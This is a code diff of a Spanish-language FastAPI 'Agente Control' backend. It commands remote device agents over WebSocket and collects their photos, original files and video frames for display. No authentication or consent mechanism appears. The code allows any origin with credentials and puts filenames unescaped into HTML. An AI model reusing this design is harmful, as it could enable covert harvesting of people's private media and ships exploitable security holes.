@@ -2,18 +2,21 @@ import json
 import base64
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 from typing import List, Dict, Any
 from urllib.parse import unquote
 
-app = FastAPI(title="Agente Control Backend (vFINAL - Definitivo)")
+app = FastAPI(title="Agente Control Backend (vFINAL - Video Frames)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
-# --- "BASE DE DATOS" EN MEMORIA ---
+# --- "BASE DE DATOS" EN MEMORIA CON ESTADO Y FRAMES ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
-device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}
+# La caché ahora guarda una lista de frames para cada video
+# Formato: { "device_id": { "mi_video.mp4": { "small_thumb_b64": "...", "frames_b64": [...] } } }
+device_media_cache: Dict[str, Dict[str, Any]] = {}
 fetch_status: Dict[str, str] = {}
 
 # --- MODELOS DE DATOS ---
@@ -30,8 +33,14 @@ class ThumbnailChunk(BaseModel):
     thumbnails: List[Thumbnail]
     is_final_chunk: bool
 
+# ¡NUEVO MODELO! Para recibir los frames de video
+class FrameChunk(BaseModel):
+    frame_b64: str
+
 # --- ENDPOINTS ---
-# (Todas las rutas hasta get_large_media se quedan exactamente igual)
+@app.get("/")
+async def root(): return {"message": "Servidor del Agente de Control activo."}
+
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
     device_name_decoded = unquote(device_name)
@@ -39,8 +48,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: 
     print(f"[CONEXIÓN] Agente conectado: '{device_name_decoded}' (ID: {device_id})")
     connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
     try:
-        while True:
-            await websocket.receive_text()
+        while True: await websocket.receive_text()
     except WebSocketDisconnect:
         name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
         print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
@@ -56,21 +64,31 @@ async def get_agents():
 async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
     if not agent: return {"status": "error", "message": "Agente no conectado"}
+    
     if command.action == "get_thumbnails":
         print(f"Limpiando caché y reiniciando estado para {command.target_id[:8]}.")
         device_media_cache[command.target_id] = {}
         fetch_status[command.target_id] = "loading"
+        
+    # Limpiamos los frames de un video antes de pedir que los vuelvan a enviar
+    if command.action == "request_video_as_frames":
+        device_id = command.target_id
+        filename = command.payload
+        if device_id in device_media_cache and filename in device_media_cache[device_id]:
+            device_media_cache[device_id][filename]['frames_b64'] = []
+            print(f"Limpiando frames antiguos para '{filename}' de {device_id[:8]}.")
+
     try:
         await agent["ws"].send_text(command.json())
         return {"status": "success", "message": "Comando enviado"}
-    except Exception as e: return {"status": "error", "message": str(e)}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
     if device_id not in device_media_cache: device_media_cache[device_id] = {}
     for thumb in chunk.thumbnails:
         device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
-    print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
     if chunk.is_final_chunk:
         fetch_status[device_id] = "complete"
         print(f"Recepción de lotes para {device_id[:8]} completada.")
@@ -84,8 +102,19 @@ async def upload_original_file(device_id: str, filename: str, file: UploadFile =
     file_bytes = await file.read()
     original_b64 = base64.b64encode(file_bytes).decode('utf-8')
     device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
-    print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
+    print(f"Recibido archivo original (IMAGEN) '{decoded_filename}' de {device_id[:8]}.")
     return {"status": "success"}
+
+# --- ¡NUEVA RUTA PARA RECIBIR CADA FOTOGRAMA DE VIDEO! ---
+@app.post("/api/upload_video_frame/{device_id}/{original_filename:path}")
+async def upload_video_frame(device_id: str, original_filename: str, frame: FrameChunk):
+    decoded_filename = unquote(original_filename)
+    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
+        return Response(content="Video no solicitado", status_code=400)
+    if 'frames_b64' not in device_media_cache[device_id][decoded_filename]:
+        device_media_cache[device_id][decoded_filename]['frames_b64'] = []
+    device_media_cache[device_id][decoded_filename]['frames_b64'].append(frame.frame_b64)
+    return {"status": "frame received"}
 
 @app.get("/api/get_media_list/{device_id}")
 async def get_media_list(device_id: str):
@@ -93,32 +122,36 @@ async def get_media_list(device_id: str):
     thumbnails = device_media_cache.get(device_id, {})
     return {"status": status, "thumbnails": thumbnails}
 
-# --- ¡FUNCIÓN MEJORADA CON LÓGICA DE TIPO DE ARCHIVO! ---
+# --- ¡RUTA MEJORADA PARA MOSTRAR IMAGEN O GALERÍA DE FRAMES! ---
 @app.get("/media/{device_id}/{filename:path}")
 async def get_large_media(device_id: str, filename: str):
     decoded_filename = unquote(filename)
     cache = device_media_cache.get(device_id, {})
     media_item = cache.get(decoded_filename)
-    
-    if not media_item or 'original_b64' not in media_item:
-        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404, media_type="application/json")
-    
-    try:
-        # Decodificamos los bytes del archivo original
-        file_bytes = base64.b64decode(media_item['original_b64'])
-        
-        # --- LÓGICA INTELIGENTE ---
-        # Determinamos el tipo de contenido basándonos en la extensión del archivo
-        media_type = "application/octet-stream" # Tipo por defecto
-        if decoded_filename.lower().endswith(('.jpg', '.jpeg')):
-            media_type = "image/jpeg"
-        elif decoded_filename.lower().endswith('.png'):
-            media_type = "image/png"
-        elif decoded_filename.lower().endswith('.mp4'):
-            media_type = "video/mp4"
-            
-        # Devolvemos los bytes con el tipo de contenido correcto
-        return Response(content=file_bytes, media_type=media_type)
-        
-    except Exception as e:
-        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500, media_type="application/json")
+
+    if not media_item:
+        return Response(content='{"detail":"Contenido no encontrado"}', status_code=404)
+
+    # Si es una IMAGEN, la mostramos directamente
+    if 'original_b64' in media_item:
+        try:
+            image_bytes = base64.b64decode(media_item['original_b64'])
+            return Response(content=image_bytes, media_type="image/jpeg")
+        except Exception as e: return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
+
+    # Si es un VIDEO, generamos y mostramos la galería de fotogramas
+    if 'frames_b64' in media_item:
+        html_content = f"""
+        <html>
+            <head><title>Frames de {decoded_filename}</title></head>
+            <body style='background-color:#222; color:white; font-family: sans-serif; text-align: center;'>
+                <h1>Fotogramas de: {decoded_filename}</h1>
+                <p>Total de frames: {len(media_item['frames_b64'])}</p>
+                <div style='display: flex; flex-wrap: wrap; justify-content: center;'>
+        """
+        for frame_b64 in media_item['frames_b64']:
+            html_content += f"<img src='data:image/jpeg;base64,{frame_b64}' style='margin:8px; border:2px solid #444; max-width: 400px;'/>"
+        html_content += "</div></body></html>"
+        return HTMLResponse(content=html_content)
+
+    return Response(content='{"detail":"Contenido no disponible para este archivo"}', status_code=404)
